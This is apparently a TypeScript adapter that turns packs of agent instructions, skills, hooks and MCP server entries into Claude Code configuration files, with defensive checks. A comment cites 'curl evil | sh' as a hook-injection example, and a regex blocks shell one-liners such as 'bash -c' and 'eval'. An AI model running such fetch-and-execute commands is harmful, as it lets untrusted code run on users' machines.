import * as fs from "node:fs/promises";
import * as path from "node:path";
import { parse as parseYaml } from "yaml";
import type {
  AdapterExportOptions,
  AdapterOutputFile,
  Atom,
} from "../schema/types.js";
import {
  atomsByType,
  defineAdapter,
  readAtomDirectory,
  readAtomFile,
  stableJsonStringify,
  wrapInstructionBlock,
} from "./types.js";

function slugFor(atom: Atom): string {
  // The atom-id regex guarantees a single `:`-separated slug component with
  // no path separators. Strip any defense-in-depth metacharacters anyway.
  const raw = atom.id.split(":")[1] ?? atom.name;
  return raw.replace(/[^a-zA-Z0-9._-]/g, "_");
}

function renderInstructionBody(
  atom: Atom,
  body: string | null,
): string {
  return `### ${atom.name}\n\n_(${atom.id})_\n\n${(body ?? atom.description).trim()}\n`;
}

function renderRuleSection(atom: Atom): string {
  return `### Rule: ${atom.name}\n\n_(${atom.id})_\n\n${atom.description.trim()}\n`;
}

interface ParsedYaml {
  [key: string]: unknown;
}

async function parseAtomYaml(
  packRoot: string,
  atom: Atom,
): Promise<ParsedYaml | null> {
  const raw = await readAtomFile(packRoot, atom);
  if (!raw) return null;
  try {
    const parsed = parseYaml(raw) as unknown;
    if (parsed && typeof parsed === "object" && !Array.isArray(parsed)) {
      return parsed as ParsedYaml;
    }
    return null;
  } catch {
    return null;
  }
}

/**
 * Allow-list check for hook command strings. A hook command may either:
 *  - Match exactly one of the pack-level `permissions.shell.commands`
 *    declarations (verbatim string match).
 *  - Be a single-token command (no spaces, no shell metacharacters), in
 *    which case it must still appear in the allow-list or we refuse.
 *
 * This prevents a malicious pack from injecting `curl evil | sh` into the
 * generated `.claude/settings.json` hooks block.
 */
function isHookCommandAllowed(command: string, allowed: string[]): boolean {
  if (!command) return false;
  // Reject obviously dangerous shells outright even if allow-listed —
  // matching `sh -c …` exactly is too easy to slip past review.
  if (/\bsh\s+-c\b|\bbash\s+-c\b|\bnode\s+-e\b|\beval\b/i.test(command)) {
    return false;
  }
  return allowed.includes(command);
}

export const claudeCodeAdapter = defineAdapter({
  target: "claude-code",
  async build(options: AdapterExportOptions) {
    const { manifest, packRoot, resolvedAtoms } = options;
    const files: AdapterOutputFile[] = [];
    const warnings: string[] = [];
    const unsupported: string[] = [];
    const byType = atomsByType(resolvedAtoms);

    const allowedShellCommands = manifest.permissions?.shell?.commands ?? [];

    // ---------- CLAUDE.md ----------
    const instructionAtoms = byType.get("instruction") ?? [];
    const ruleAtoms = byType.get("rule") ?? [];
    const workflowAtoms = byType.get("workflow") ?? [];

    const sections: string[] = [`# ${manifest.metadata.name}\n`];
    sections.push(
      `> ${manifest.metadata.description}\n\n` +
        `Publisher: \`${manifest.metadata.publisher}\` · Version: \`${manifest.metadata.version}\` · Profile: \`${options.profile}\`\n`,
    );

    if (instructionAtoms.length > 0) {
      sections.push("## Instructions\n");
      for (const atom of instructionAtoms) {
        const body = await readAtomFile(packRoot, atom);
        sections.push(renderInstructionBody(atom, body));
      }
    }
    if (ruleAtoms.length > 0) {
      sections.push("## Rules\n");
      for (const atom of ruleAtoms) sections.push(renderRuleSection(atom));
    }
    if (workflowAtoms.length > 0) {
      sections.push("## Workflows\n");
      for (const atom of workflowAtoms) {
        sections.push(
          `### ${atom.name}\n\n_(${atom.id})_\n\n${atom.description}\n`,
        );
      }
    }

    files.push({
      path: "CLAUDE.md",
      content: wrapInstructionBlock(
        manifest.metadata.id,
        sections.join("\n"),
      ),
      action: "create",
    });

    // ---------- Skills ----------
    const skillAtoms = byType.get("skill") ?? [];
    for (const atom of skillAtoms) {
      const slug = slugFor(atom);
      const entries = await readAtomDirectory(packRoot, atom);
      if (entries.length === 0) {
        warnings.push(
          `Skill \`${atom.id}\` directory not found at \`${atom.path}\`; emitting minimal SKILL.md.`,
        );
        files.push({
          path: `.claude/skills/${slug}/SKILL.md`,
          content: `---\nname: ${slug}\ndescription: ${atom.description}\n---\n\n# ${atom.name}\n\n${atom.description}\n`,
          action: "create",
        });
      } else {
        for (const entry of entries) {
          files.push({
            path: `.claude/skills/${slug}/${entry.relPath}`,
            content: entry.content,
            action: "create",
          });
        }
      }
    }

    // ---------- Commands (compile to skill-style folders) ----------
    const commandAtoms = byType.get("command") ?? [];
    for (const atom of commandAtoms) {
      const slug = slugFor(atom);
      const parsed = await parseAtomYaml(packRoot, atom);
      const invocation = parsed?.["invocation"] as
        | { slash?: string; cli?: string }
        | undefined;
      let body: string | null = null;
      const promptPath = parsed?.["prompt"];
      if (typeof promptPath === "string" && promptPath.length > 0) {
        body = await readPromptFile(packRoot, promptPath);
      }
      const header = `---\nname: ${slug}\ndescription: ${atom.description}\n---\n\n`;
      const slash = invocation?.slash ? `Invocation: \`${invocation.slash}\`\n\n` : "";
      files.push({
        path: `.claude/skills/${slug}/SKILL.md`,
        content: `${header}# ${atom.name}\n\n${slash}${body ?? atom.description}\n`,
        action: "create",
      });
    }

    // ---------- Subagents ----------
    const subagentAtoms = byType.get("subagent") ?? [];
    for (const atom of subagentAtoms) {
      const slug = slugFor(atom);
      const parsed = await parseAtomYaml(packRoot, atom);
      const instructions =
        typeof parsed?.["instructions"] === "string"
          ? (parsed["instructions"] as string).trim()
          : atom.description;
      files.push({
        path: `.claude/agents/${slug}.md`,
        content:
          `---\nname: ${slug}\ndescription: ${atom.description}\nrisk_level: ${atom.risk_level}\n---\n\n# ${atom.name}\n\n${instructions}\n`,
        action: "create",
      });
    }

    // ---------- settings.json (hooks + MCP servers) ----------
    const hookAtoms = byType.get("hook") ?? [];
    const mcpAtoms = byType.get("mcp_server") ?? [];
    if (hookAtoms.length > 0 || mcpAtoms.length > 0) {
      const settings: Record<string, unknown> = {};
      if (hookAtoms.length > 0) {
        const hooks: Record<string, unknown[]> = {};
        for (const atom of hookAtoms) {
          const parsed = await parseAtomYaml(packRoot, atom);
          const events =
            ((atom as { lifecycle?: { events?: { "claude-code"?: string[] } } })
              .lifecycle?.events?.["claude-code"] ??
              (parsed?.["events"] as { "claude-code"?: string[] } | undefined)
                ?.["claude-code"] ??
              ["PostToolUse"]) as string[];
          const handler = (parsed?.["handler"] as { command?: string } | undefined)
            ?? (atom as { handler?: { command?: string } }).handler;
          const command = handler?.command ?? "";
          if (!isHookCommandAllowed(command, allowedShellCommands)) {
            warnings.push(
              `Hook \`${atom.id}\` declares command \`${command || "(empty)"}\` which is NOT listed in \`permissions.shell.commands\`. Refusing to emit it into settings.json.`,
            );
            unsupported.push(atom.id);
            continue;
          }
          for (const evt of events) {
            const list = hooks[evt] ?? [];
            list.push({
              matcher: "*",
              hooks: [
                {
                  type: "command",
                  command,
                  description: atom.description,
                  risk_level: atom.risk_level,
                  source_atom: atom.id,
                },
              ],
            });
            hooks[evt] = list;
          }
        }
        if (Object.keys(hooks).length > 0) settings.hooks = hooks;
        warnings.push(
          "Hook atom(s) installed — they run shell commands after agent edits. Review before enabling.",
        );
      }
      if (mcpAtoms.length > 0) {
        const mcpServers: Record<string, unknown> = {};
        for (const atom of mcpAtoms) {
          const slug = slugFor(atom);
          const a = atom as {
            transport?: string;
            command?: string;
            args?: string[];
            env?: Record<string, unknown>;
            url?: string;
          };
          mcpServers[slug] = {
            transport: a.transport ?? "stdio",
            command: a.command,
            args: a.args ?? [],
            env: Object.fromEntries(
              Object.entries(a.env ?? {}).map(([k]) => [k, `\${${k}}`]),
            ),
            url: a.url,
            description: atom.description,
            risk_level: atom.risk_level,
            source_atom: atom.id,
          };
          warnings.push(
            `MCP server \`${atom.id}\` configured. Required env: ${Object.keys(a.env ?? {}).join(", ") || "(none)"}.`,
          );
        }
        if (Object.keys(mcpServers).length > 0) settings.mcpServers = mcpServers;
      }
      if (Object.keys(settings).length > 0) {
        files.push({
          path: ".claude/settings.json",
          content: stableJsonStringify(settings),
          action: "create",
        });
      }
    }

    const supportedTypes = new Set([
      "instruction",
      "rule",
      "workflow",
      "skill",
      "command",
      "subagent",
      "hook",
      "mcp_server",
    ]);
    for (const r of resolvedAtoms) {
      if (!supportedTypes.has(r.atom.type)) {
        unsupported.push(r.atom.id);
        warnings.push(
          `Atom \`${r.atom.id}\` of type \`${r.atom.type}\` has no Claude Code adapter mapping; emitted as note only.`,
        );
      }
    }

    return { files, warnings, unsupportedAtoms: unsupported };
  },
});

async function readPromptFile(
  packRoot: string,
  relPath: string,
): Promise<string | null> {
  // Containment: reject absolute paths and `..` traversal — same rules as
  // atom.path. The prompt path is a manifest-controlled string referenced
  // from an atom body file (yaml `prompt:` field), so the trust boundary is
  // the same as the atom itself.
  if (
    path.isAbsolute(relPath) ||
    relPath.startsWith("~") ||
    relPath.split(/[\\/]+/).includes("..")
  ) {
    return null;
  }
  const target = path.resolve(packRoot, relPath);
  const rel = path.relative(packRoot, target);
  if (rel.startsWith("..") || path.isAbsolute(rel)) return null;
  try {
    return await fs.readFile(target, "utf8");
  } catch (err) {
    const e = err as NodeJS.ErrnoException;
    if (e.code === "ENOENT") return null;
    throw err;
  }
}
